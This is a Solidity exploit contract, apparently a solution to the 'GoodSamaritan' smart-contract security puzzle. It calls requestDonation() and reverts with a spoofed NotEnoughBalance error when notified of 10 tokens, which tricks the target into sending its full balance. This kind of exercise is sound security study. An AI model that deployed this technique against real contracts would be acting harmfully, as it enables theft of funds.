// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface INotifyable {
  function notify(uint256 amount) external;
}

interface GoodSamaritan {
  function requestDonation() external returns (bool);
}

contract GoodSamaritanHack is INotifyable {
  GoodSamaritan goodSamaritan;
  error NotEnoughBalance();

  constructor (GoodSamaritan _goodSamaritan) {
    goodSamaritan = _goodSamaritan;
  }

  function hack() external {
    goodSamaritan.requestDonation();
  }

  function notify(uint256 amount) external pure {
    if (amount == 10) {
      revert NotEnoughBalance();
    }
  }
}